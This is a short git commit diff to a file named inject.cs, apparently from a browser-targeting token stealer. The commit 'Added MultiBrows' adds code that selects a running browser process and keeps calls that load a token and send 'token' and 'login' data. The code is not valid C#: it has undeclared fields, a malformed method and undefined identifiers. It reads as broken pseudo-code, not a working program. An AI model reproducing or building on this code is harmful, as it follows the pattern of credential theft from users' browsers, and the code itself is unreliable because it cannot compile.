de94875e55661e53c4c114909a7488819f0b81e6
OfficialLucky <Jamesash1@live.com>
2017-10-21 18:36:56 -0400

    Added MultiBrows

--- inject.cs
+++ inject.cs
@@ -4,10 +4,18 @@ Namespace Inject {
 
   public class Inject {
   
-  privatef = new jRace.PrivateClass.Main(); 
-  void(){
-  privatef.Load(token.Method());
-  privatef.Send(token, login);
+  file = new jRace.PrivateClass.Main(); 
+    brows = new jRace.PrivateClass.Brows(); 
+    
+    private main() {
+    var browser = brows.runproc(get());
+      brows.getID(browser);
+    brows.Select(ID);
+      return(load);
+    }
+  load void(){
+  file.Load(token.Method());
+  file.Send(token, login);
   return(saftynet);
 }
   }
